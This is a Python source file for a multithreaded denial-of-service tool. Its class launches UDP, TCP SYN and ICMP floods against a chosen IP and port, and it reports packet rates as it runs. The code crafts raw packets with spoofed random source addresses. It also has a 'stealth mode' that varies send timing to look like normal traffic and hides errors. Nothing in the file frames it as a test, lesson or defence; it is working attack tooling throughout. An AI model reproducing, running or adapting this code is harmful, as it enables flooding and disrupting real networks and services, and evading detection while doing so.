import asyncio
import socket
import random
import time
import threading
import struct
from typing import Dict, Any, Optional, List
import statistics
import psutil

class Layer4AttackManager:
    """
    Advanced Layer 4 attack manager supporting multiple flood types.
    """

    def __init__(self, target_ip: str, method: str = "udp", port: int = 80,
                 packet_size: int = 1024, threads: int = 100, duration: int = 0,
                 stealth_mode: bool = False):
        self.target_ip = target_ip
        self.method = method.lower()
        self.port = port
        self.packet_size = packet_size
        self.threads = threads
        self.duration = duration
        self.stealth_mode = stealth_mode

        # Attack statistics
        self.packets_sent = 0
        self.bytes_sent = 0
        self.attack_active = False
        self.start_time = 0.0

        # Thread management
        self.attack_threads: List[threading.Thread] = []
        self.lock = threading.Lock()

        # Stealth features
        self.source_ports = []
        self.random_delays = []

        if self.stealth_mode:
            self._initialize_stealth_features()

    def _initialize_stealth_features(self):
        """Initialize stealth attack features."""
        # Generate random source ports
        self.source_ports = [random.randint(1024, 65535) for _ in range(1000)]

        # Variable delays to mimic normal traffic
        self.random_delays = [random.uniform(0.001, 0.1) for _ in range(500)]

    def _generate_udp_packet(self) -> bytes:
        """Generate a UDP packet payload."""
        payload = bytes(random.getrandbits(8) for _ in range(self.packet_size))
        return payload

    def _generate_tcp_packet(self) -> bytes:
        """Generate a TCP SYN packet."""
        # IP Header (20 bytes)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              0x45,  # Version and IHL
                              0,     # DSCP and ECN
                              40,    # Total length (20 IP + 20 TCP)
                              0,     # Identification
                              0,     # Flags and fragment offset
                              255,   # TTL
                              6,     # Protocol (TCP)
                              0,     # Header checksum (will be calculated)
                              socket.inet_aton(self._get_random_source_ip()),  # Source IP
                              socket.inet_aton(self.target_ip))  # Destination IP

        # TCP Header (20 bytes)
        tcp_header = struct.pack('!HHLLBBHHH',
                               random.randint(1024, 65535),  # Source port
                               self.port,                    # Destination port
                               0,                           # Sequence number
                               0,                           # Acknowledgment number
                               0x50,                        # Data offset and reserved
                               0x02,                        # SYN flag
                               4096,                        # Window size
                               0,                           # Checksum
                               0)                           # Urgent pointer

        return ip_header + tcp_header

    def _get_random_source_ip(self) -> str:
        """Generate a random source IP for spoofing."""
        if self.stealth_mode:
            # Use realistic IP ranges
            ip_ranges = [
                "192.168.1.{}", "10.0.0.{}", "172.16.0.{}",
                "203.0.113.{}", "198.51.100.{}", "100.64.0.{}"
            ]
            ip_range = random.choice(ip_ranges)
            return ip_range.format(random.randint(1, 255))
        return f"192.168.1.{random.randint(1, 255)}"

    def _udp_flood_worker(self, thread_id: int):
        """UDP flood worker thread."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Enable IP spoofing if possible
        try:
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            pass  # Not all systems support this

        packets_per_thread = 0

        while self.attack_active and (self.duration == 0 or (time.time() - self.start_time) < self.duration):
            try:
                payload = self._generate_udp_packet()
                source_ip = self._get_random_source_ip()

                # Send packet
                sock.sendto(payload, (self.target_ip, self.port))
                packets_per_thread += 1

                # Update global counters
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(payload)

                # Stealth mode delay
                if self.stealth_mode and self.random_delays:
                    time.sleep(random.choice(self.random_delays))

            except Exception as e:
                if self.stealth_mode:
                    # In stealth mode, be less verbose
                    pass
                else:
                    print(f"UDP Thread {thread_id} error: {e}")

        sock.close()
        print(f"UDP Thread {thread_id} sent {packets_per_thread} packets")

    def _tcp_syn_flood_worker(self, thread_id: int):
        """TCP SYN flood worker thread."""
        packets_per_thread = 0

        while self.attack_active and (self.duration == 0 or (time.time() - self.start_time) < self.duration):
            try:
                # Create raw socket for SYN packets
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                packet = self._generate_tcp_packet()
                sock.sendto(packet, (self.target_ip, self.port))
                packets_per_thread += 1

                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)

                sock.close()

                # Stealth mode delay
                if self.stealth_mode and self.random_delays:
                    time.sleep(random.choice(self.random_delays))

            except Exception as e:
                if self.stealth_mode:
                    pass
                else:
                    print(f"SYN Thread {thread_id} error: {e}")

        print(f"SYN Thread {thread_id} sent {packets_per_thread} packets")

    def _icmp_flood_worker(self, thread_id: int):
        """ICMP flood worker thread."""
        packets_per_thread = 0

        while self.attack_active and (self.duration == 0 or (time.time() - self.start_time) < self.duration):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

                # ICMP Echo Request
                icmp_header = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                payload = bytes(random.getrandbits(8) for _ in range(self.packet_size))

                packet = icmp_header + payload
                sock.sendto(packet, (self.target_ip, 0))
                packets_per_thread += 1

                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)

                sock.close()

                # Stealth mode delay
                if self.stealth_mode and self.random_delays:
                    time.sleep(random.choice(self.random_delays))

            except Exception as e:
                if self.stealth_mode:
                    pass
                else:
                    print(f"ICMP Thread {thread_id} error: {e}")

        print(f"ICMP Thread {thread_id} sent {packets_per_thread} packets")

    def _get_system_bandwidth(self) -> float:
        """Get current system bandwidth usage."""
        try:
            net_io = psutil.net_io_counters()
            return (net_io.bytes_sent + net_io.bytes_recv) / 1024 / 1024  # MB/s
        except:
            return 0.0

    def _get_cpu_usage(self) -> float:
        """Get current CPU usage."""
        try:
            return psutil.cpu_percent(interval=1)
        except:
            return 0.0

    def start_attack(self) -> Dict[str, Any]:
        """Start the Layer 4 attack."""
        print(f"🌊 Starting {self.method.upper()} flood attack on {self.target_ip}:{self.port}")
        print(f"Threads: {self.threads}, Packet Size: {self.packet_size} bytes")

        self.attack_active = True
        self.start_time = time.time()

        # Choose attack method
        if self.method == "udp":
            worker_func = self._udp_flood_worker
        elif self.method == "syn":
            worker_func = self._tcp_syn_flood_worker
        elif self.method == "icmp":
            worker_func = self._icmp_flood_worker
        else:
            print(f"❌ Unsupported L4 method: {self.method}")
            return {"error": "Unsupported method"}

        # Start attack threads
        for i in range(self.threads):
            thread = threading.Thread(target=worker_func, args=(i,))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)

        # Monitor attack progress
        try:
            while self.attack_active and (self.duration == 0 or (time.time() - self.start_time) < self.duration):
                elapsed = time.time() - self.start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                bandwidth = self._get_system_bandwidth()
                cpu_usage = self._get_cpu_usage()

                print(f"📊 Attack Progress: {self.packets_sent:,} packets sent | "
                      f"Rate: {rate:.0f} pps | BW: {bandwidth:.1f} MB/s | CPU: {cpu_usage:.1f}%")

                time.sleep(2)

        except KeyboardInterrupt:
            print("⚠️ Attack interrupted by user")

        # Stop attack
        self.attack_active = False

        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=1.0)

        # Calculate final statistics
        total_time = time.time() - self.start_time
        final_rate = self.packets_sent / total_time if total_time > 0 else 0

        result = {
            "packets_sent": self.packets_sent,
            "bytes_sent": self.bytes_sent,
            "duration": total_time,
            "average_rate": final_rate,
            "method": self.method,
            "target": f"{self.target_ip}:{self.port}",
            "threads_used": self.threads
        }

        print("✅ Layer 4 attack completed!")
        print(f"📈 Final Stats: {result['packets_sent']:,} packets | "
              f"Rate: {result['average_rate']:.0f} pps | "
              f"Duration: {result['duration']:.1f}s")

        return result

    def stop_attack(self):
        """Stop the ongoing attack."""
        print("🛑 Stopping Layer 4 attack...")
        self.attack_active = False
